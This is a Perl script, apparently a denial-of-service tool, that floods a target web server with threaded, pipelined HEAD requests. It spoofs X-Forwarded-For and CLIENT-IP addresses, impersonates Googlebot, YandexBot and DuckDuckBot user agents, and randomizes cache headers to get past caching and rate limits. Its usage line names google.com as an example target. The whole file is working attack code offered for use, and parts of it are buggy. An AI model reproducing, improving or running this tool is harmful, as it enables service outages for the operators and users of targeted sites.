#!/usr/bin/perl
package control;

my $ip;


sub new {
    my ($class,$i) = @_;
    $ip = $i;
    my $self={};
    $ip = $i;
    bless $self, $class;
    return $self;
}

sub mas {
my ($self,$veces) = @_;
$veces = 1 if($veces eq "");
my ($a,$e,$o,$b) = split(/\./,$ip);
for($as=0;$as<$veces;$as++) {
$b++;
if($b>=255) {$b=0;$o++;}
if($o>=255) {$o=0;$e++;}
if($e>=255) {$e=0;$a++;}
die("Sem Ip!\n") if($a>=255);
}
$ip = join "",$a,".",$e,".",$o,".",$b;
return $ip;
}

1;

package main;

use Socket;
use IO::Socket::INET;
use threads ('yield',
                'stack_size' => 64*4096,
                'exit' => 'threads_only',
                'stringify');
use threads::shared;

my @ualist = (
"DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
);

my $random_number = int(rand(10));
my @cachetype = ("no-cache","no-store","max-age=$random_number","max-stale=$random_number","min-fresh=$random_number","notransform","only-if-cache");
my @accpettype =("compress,gzip","","*","compress;q=0,5, gzip;q=1.0","gzip;q=1.0, indentity; q=0.5, *;q=0");

my $method = "HEAD";
my @vals = ('a','b','c','d','e','f','g','h','i','j','k','l','n','o','p','q','r','s','t','u','w','x','y','z',0,1,2,3,4,5,6,7,8,9);
my $randsemilla = "";
for($i = 0; $i < 30; $i++) {
    $randsemilla .= $vals[int(rand($#vals))];
}
sub socker {
    my ($remote,$port) = @_;
    my ($iaddr, $paddr, $proto);
    $iaddr = inet_aton($remote) || return false;
    $paddr = sockaddr_in($port, $iaddr) || return false;
    $proto = getprotobyname('tcp');
    socket(SOCK, PF_INET, SOCK_STREAM, $proto);
    connect(SOCK, $paddr) || return false;
    return SOCK;
}


sub sender {
    my ($max,$puerto,$host,$file) = @_;
    my $sock;
    while(true) {
        my $paquete = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
        unless($sock) {
            sleep(1);
            flooder();
            next;
        }
        for($i=0;$i<$porconexion;$i++) {
            $ipinicial = $sumador->mas();
            my $filepath = $file;
            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g;
            $paquete .= join "",$method," /",$filepath," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: $ualist[rand @ualist]","\r\nCache-Control: $cachetype[rand @cachetype]","\r\nCLIENT-IP: ",$ipinicial,"\r\nX-Forwarded-For: ",$ipinicial,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: $accpettype[rand @accpettype]\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        }
        print $sock $paquete;
    }
}
sub flooder {
   my $sock_;
   for($v = 0;$v<10;$v++)
   {
      $sock_ = &socker($host,$puerto);
      my $randnum = rand(500*10000);
      $pack .= join "X-" + $randnum + ": 1\r\n";
   }
   print $sock_ $pack;
}

sub sender2 {
    my ($puerto,$host,$paquete) = @_;
    my $sock;
    my $sumador :shared;
    while(true) {
        $sock = &socker($host,$puerto);
        unless($sock) {
            print "\nAttack Started\n\n";
            next;
        }
        print $sock $paquete;
    }
}

sub comenzar {
    $counter = 0;
    $url = $ARGV[0];
    print "URL: ".$url."\n";
    $max = $ARGV[1];
    $porconexion = $ARGV[2];
    $ipfake = $ARGV[3];
    if($porconexion < 1) {
        print "[-]Hazırlanıyor...\n";
        exit;
    }
    if($url !~ /^http:\/\//) {
        die("[x] URL Geçersiz!\n");
    }
    $url .= "/" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
    ($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
    $puerto = 443;
    ($host,$puerto) = ($host =~ /(.*?):(.*)/) if($host =~ /(.*?):(.*)/);
    $file =~ s/\s/ /g;
    print join "","[!]",$max," Bot Upload!\n";
    $file = "/".$file if($file !~ /^\//);
    print join "","Hedef: ",$host,":",$puerto,"\nUzantı: ",$file,"\n\n";
    print "[-]Saldiri Bekleniyor ...\n";
    if($ipfake eq "") {
        my $paquetebase = join "",$method," /",$file," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: $ualist[rand @ualist]","\r\nCache-Control: $cachetype[rand @cachetype]","\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: $accpettype[rand @accpettype]\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        $paquetesender = "";
        $paquetesender = $paquetebase x $porconexion;
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender2', ($puerto,$host,$paquetesender));
        }
    } else {
        $sumador = control->new($ipfake);
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender', ($porconexion,$puerto,$host,$file));
        }
    }
    print "[+]Saldiri Baslatildi...\n";
    for($v=0;$v<$max;$v++) {
        if (my $error = $thr[$v]->error()) {
           $thr[$v]->kill('STOP');
        }
        else
        {
          if ($thr[$v]->is_running()) { sleep(3); }
          else { sleep(5); }
        }
        if ($thr[$v]->is_joinable()) { $thr[$v]->join(); }
        if($counter > 1800) { $counter = 0; sleep(5); }
       $v--;
    }
    print "FIM!\n";
}


if($#ARGV > 2) {
    comenzar();
} else {
	die("\nperl x.pl http://www.google.com 400 200 127.0.0.1\nAuthor : Aesir\n");
  
}
